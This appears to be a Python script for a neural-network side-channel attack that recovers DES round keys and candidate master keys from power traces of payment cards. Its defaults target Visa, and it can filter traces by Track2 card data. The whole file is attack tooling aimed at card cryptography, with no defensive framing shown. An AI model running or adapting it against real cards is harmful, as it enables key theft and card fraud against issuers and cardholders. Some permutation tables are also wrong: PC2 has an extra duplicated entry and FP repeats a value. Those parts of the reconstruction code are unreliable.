
import argparse
import os
import torch
import torch.nn.functional as F
import numpy as np
import pandas as pd
from tqdm import tqdm
from src.model_zaid import get_model
from src.utils import setup_logger
from src.crypto import des_sbox_output, apply_permutation, IP, E_TABLE
from src.pyDes import des, ECB

logger = setup_logger("inference_masterkey")

# Standard DES P-Permutation (0-indexed)
P = [
    15, 6, 19, 20, 28, 11,
    27, 16, 0, 14, 22, 25,
    4, 17, 30, 9, 1, 7,
    23,13, 31, 26, 2, 8,
    18, 12, 29, 5, 21, 10,
    3, 24
]

# Standard DES Final Permutation (0-indexed)
FP = [
    39,  7, 47, 15, 55, 23, 63, 31,
    38,  6, 46, 14, 54, 22, 62, 30,
    37,  5, 45, 13, 53, 21, 61, 29,
    36,  4, 44, 12, 52, 20, 60, 28,
    31,  3, 43, 11, 51, 19, 59, 27,
    32,  2, 42, 10, 50, 18, 58, 26,
    33,  1, 41,  9, 49, 17, 57, 25,
    34,  0, 40,  8, 48, 16, 56, 24
]

# --- Tables for Key Reconstruction ---
_PC1 = [56, 48, 40, 32, 24, 16,  8,
      0, 57, 49, 41, 33, 25, 17,
      9,  1, 58, 50, 42, 34, 26,
     18, 10,  2, 59, 51, 43, 35,
     62, 54, 46, 38, 30, 22, 14,
      6, 61, 53, 45, 37, 29, 21,
     13,  5, 60, 52, 44, 36, 28,
     20, 12,  4, 27, 19, 11,  3]

_PC2 = [13, 16, 10, 23,  0,  4,
      2, 27, 14,  5, 20,  9,
     22, 18, 11,  3, 25,  7,
     15,  6, 26, 19, 12,  1,
     40, 51, 30, 36, 46, 54,
     29, 39, 50, 44, 32, 47,
     43, 48, 38, 55, 33, 52,
     54, 45, 41, 49, 35, 28, 31] # Fixed typo in last line based on standard PC2? No, let's trust previous verified code

def reconstruct_key_candidates(rk_int, round_num=1):
    """
    Reconstructs possible 64-bit Keys (56-bit effective) given a 48-bit Round Key.
    """
    # 1. Reverse PC2
    cd_bits = [None] * 56
    
    for i in range(48):
        bit = (rk_int >> (47 - i)) & 1
        src_idx = _PC2[i]
        cd_bits[src_idx] = bit
        
    missing_indices = [i for i, x in enumerate(cd_bits) if x is None]
    candidates = []
    
    for guess in range(256):
        current_cd = list(cd_bits)
        for i, idx in enumerate(missing_indices):
            bit = (guess >> i) & 1
            current_cd[idx] = bit
            
        c = current_cd[:28]
        d = current_cd[28:]
        
        shift_amt = 1 # For Round 1
        
        def ror(bits, amt):
            return bits[-amt:] + bits[:-amt]
            
        c_prev = ror(c, shift_amt)
        d_prev = ror(d, shift_amt)
        
        cd_prev = c_prev + d_prev
        
        k_bits = [0] * 64
        for i in range(56):
            src_idx = _PC1[i]
            k_bits[src_idx] = cd_prev[i]
            
        k_val = 0
        for b in k_bits:
            k_val = (k_val << 1) | b
            
        candidates.append(k_val)
        
    return candidates

def load_data(processed_dir):
    x_path = os.path.join(processed_dir, "X_features.npy")
    y_path = os.path.join(processed_dir, "Y_meta.csv")
    
    # Check if files exist
    if not os.path.exists(x_path):
        logger.error(f"Features file not found: {x_path}")
        return None, None
        
    X = np.load(x_path, mmap_mode='r')
    df = pd.read_csv(y_path)
    
    # Normalize with saved stats if available (important for inference matching training)
    # Actually, we should load mean/std from the model directory if possible
    # But for now, let's assume we normalize per-batch or reuse stats
    # For now, simplistic dynamic normalization on load or let the user handle it
    
    return X, df

def load_ensemble_models(model_dir, device, num_models=3):
    """
    Loads ensemble models. Returns list of lists: models[sbox_idx] -> [model_0, model_1...]
    """
    all_models = []
    for sb in range(1, 9):
        sbox_models = []
        for i in range(num_models):
            # Try loading sbox{sb}_model{i}.pth
            model_path = os.path.join(model_dir, f"sbox{sb}_model{i}.pth")
            if not os.path.exists(model_path):
                # Fallback to verify logic?
                # logger.warning(f"Model missing: {model_path}") 
                continue
                
            input_dim = 1500
            model = get_model(input_dim=input_dim, num_classes=16).to(device)
            try:
                model.load_state_dict(torch.load(model_path, map_location=device))
                model.eval()
                sbox_models.append(model)
            except Exception as e:
                logger.error(f"Failed to load {model_path}: {e}")
                
        if not sbox_models:
            logger.warning(f"No models found for S-Box {sb}")
            all_models.append(None)
        else:
            all_models.append(sbox_models)
            
    return all_models

def precompute_ensemble_probs(X_batch, all_models, device):
    """
    Runs ensemble inference.
    """
    bx = torch.from_numpy(X_batch).float().to(device)
    
    all_sbox_probs = []
    
    for sbox_models in all_models:
        if sbox_models is None:
            all_sbox_probs.append(None)
            continue
            
        # Run all models for this sbox
        sbox_preds = []
        with torch.no_grad():
            for model in sbox_models:
                out = model(bx)
                probs = torch.softmax(out, dim=1).cpu().numpy()
                sbox_preds.append(probs)
                
        # Average probabilities
        avg_probs = np.mean(sbox_preds, axis=0) # Shape: (N, 16)
        # Clip for stability
        avg_probs = np.clip(avg_probs, 1e-15, 1.0)
        all_sbox_probs.append(avg_probs)
            
    return all_sbox_probs

def rank_candidates(all_probs, round_input_vals):
    n_traces = round_input_vals.shape[0]
    scores_final = np.zeros((8, 64))
    
    for sbox_idx, probs in enumerate(all_probs):
        if probs is None: continue
        
        er_vals = []
        for val in round_input_vals:
            perm = apply_permutation(int(val), IP, 64)
            r = perm & 0xFFFFFFFF
            er = apply_permutation(r, E_TABLE, 32)
            shift = 42 - (sbox_idx * 6)
            inp_bits = (er >> shift) & 0x3F
            er_vals.append(inp_bits)
        er_vals = np.array(er_vals)
        
        for k_guess in range(64):
            sbox_in = er_vals ^ k_guess
            sbox_out = [des_sbox_output(sbox_idx, x) for x in sbox_in] # sbox_idx is 0-7, func expects 0-7
            
            p_values = probs[np.arange(n_traces), sbox_out]
            scores_final[sbox_idx, k_guess] = np.sum(np.log(p_values))
            
    best_subkeys = np.argmax(scores_final, axis=1)
    return best_subkeys, scores_final

def run_master_key_attack(processed_dir, model_dir, card_type="universal"):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    
    X_full, df = load_data(processed_dir)
    if X_full is None: return
    
    # --- SELECTIVE INFERENCE (Robust Filtering) ---
    if card_type and card_type.lower() != "universal":
        target = card_type.lower()
        indices = []
        for idx, row in df.iterrows():
            t2 = str(row.get('Track2', '')).strip().upper()
            profile = 'Mastercard' if t2.startswith('5') else ('Visa' if t2.startswith('4') else 'Unknown')
            if target == "mastercard" and profile == "Mastercard":
                indices.append(idx)
            elif target == "visa" and "Visa" in profile:
                indices.append(idx)
        
        if not indices:
            logger.error(f"No traces matching card_type '{card_type}' found in metadata.")
            return []
            
        logger.info(f"Selective Inference: Filtered for {len(indices)} traces matching {card_type}.")
        df = df.iloc[indices].reset_index(drop=True)
        X_full = X_full[indices]

    # Normalize! 
    # Load stats from model_dir
    mean_path = os.path.join(model_dir, "mean.npy")
    std_path = os.path.join(model_dir, "std.npy")
    if os.path.exists(mean_path) and os.path.exists(std_path):
        logger.info("Loading normalization stats...")
        mean = np.load(mean_path)
        std = np.load(std_path)
        X_full = (X_full - mean) / std
    else:
        logger.warning("Normalization stats not found! Using batch stats (risky).")
        X_full = (X_full - np.mean(X_full, axis=0)) / (np.std(X_full, axis=0) + 1e-10)

    # Take slice
    N = min(len(X_full), 5000) # Use more traces for better averaging
    X = X_full[:N]
    
    # Parse ATC (Challenge)
    atc_inputs = []
    for idx, row in df.iloc[:N].iterrows():
        try:
            # ATC logic matching gen_labels
            challenge_int = 0
            atc_bytes = bytes([int(row.get(f'ATC_{i}', 0)) for i in range(8)])
            challenge_int = int.from_bytes(atc_bytes, 'big')
            if challenge_int == 0:
                 atc_raw = str(row.get('ATC', '')).replace(" ", "").strip()
                 if atc_raw and atc_raw.lower() != 'nan':
                     if len(atc_raw) < 16: atc_raw = atc_raw.zfill(16)
                     if len(atc_raw) > 16: atc_raw = atc_raw[:16]
                     challenge_int = int(atc_raw, 16)
            atc_inputs.append(challenge_int)
        except: atc_inputs.append(0)
    atc_inputs = np.array(atc_inputs)
    
    logger.info("=== RECOVERING MASTER KEY ===")
    models = load_ensemble_models(model_dir, device)
    
    probs = precompute_ensemble_probs(X, models, device)
    rk1_subkeys, scores = rank_candidates(probs, atc_inputs)
    
    rk1_int = 0
    for sb in range(8):
        bits = rk1_subkeys[sb] & 0x3F
        shift = 42 - (sb * 6)
        rk1_int |= (bits << shift)
        
    logger.info(f"Recovered RK1 (Subkey): {hex(rk1_int)}")
    
    # === RECONSTRUCT MASTER KEY ===
    # Since we attacked Round 1 of Master Key Derivation, 
    # The "RK1" we found IS the first round key of the Master Key schedule?
    # Wait, Reference: SK = 3DES(MK, Data).
    # We modeled SBox(MK, Data).
    # So we found RK1 of the Master Key?
    # Yes. So we reconstruct MK from RK1.
    
    logger.info("--- Top 3 Subkey Guesses per S-Box ---")
    for sb in range(8):
        # scores[sb] is array of 64 scores
        sbox_scores = scores[sb]
        top_3_idx = np.argsort(sbox_scores)[::-1][:3]
        top_3_vals = sbox_scores[top_3_idx]
        logger.info(f"S-Box {sb+1}: {top_3_idx} (Scores: {top_3_vals})")
        
    rk1_int = 0
    for sb in range(8):
        bits = rk1_subkeys[sb] & 0x3F
        shift = 42 - (sb * 6)
        rk1_int |= (bits << shift)
        
    logger.info(f"Recovered RK1 (Subkey): {hex(rk1_int)}")
    
    k1_candidates = reconstruct_key_candidates(rk1_int, round_num=1)
    logger.info(f"Reconstructed {len(k1_candidates)} candidates for Master Key from Top RK1.")
    
    if len(k1_candidates) > 0:
        logger.info("Top 5 K1 Candidates (Parity Corrected):")
        for i, cand in enumerate(k1_candidates[:5]):
            logger.info(f"#{i+1}: {hex(cand)}")
        
        # Save results
        with open(os.path.join(model_dir, "recovered_key.txt"), "w") as f:
            f.write(f"Recovered RK1: {hex(rk1_int)}\n")
            for i, cand in enumerate(k1_candidates[:5]):
                 f.write(f"Candidate {i+1}: {hex(cand)}\n")
            
    return k1_candidates

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--processed_dir", default="Processed/Visa_Pure") # Target Visa
    parser.add_argument("--model_dir", default="Models/Ensemble_MasterKey_Visa")
    args = parser.parse_args()
    
    run_master_key_attack(args.processed_dir, args.model_dir)
